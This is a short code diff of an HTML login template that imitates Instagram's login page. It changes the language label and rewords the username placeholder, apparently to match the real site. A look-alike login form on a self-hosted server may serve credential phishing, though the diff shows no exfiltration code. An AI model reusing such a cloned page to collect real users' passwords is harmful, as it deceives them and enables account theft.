@@ -8,7 +8,7 @@
 
 <div class="lg-page">
         
-       <div class="lg-lang">English (UK)</div>
+       <div class="lg-lang">English (US)</div>
         
        <div class="lg-logo">
             <img src="../static/images/instagram.png" alt="instagram">
@@ -16,7 +16,7 @@
         
        <form class="lg-form" action="/v1/Login" method="post">
             <input type="hidden" name="csrf_token" value="{{.CSRFToken}}"> 
-            <input type="text" placeholder="Phone number, username, or email" name="u_name">
+            <input type="text" placeholder="Username, email or mobile number" name="u_name">
             <input type="password" placeholder="Password" name="pass">
             <button class="lg-submit" type="submit">Log in</button>
             {{if .InvalidUsername}}
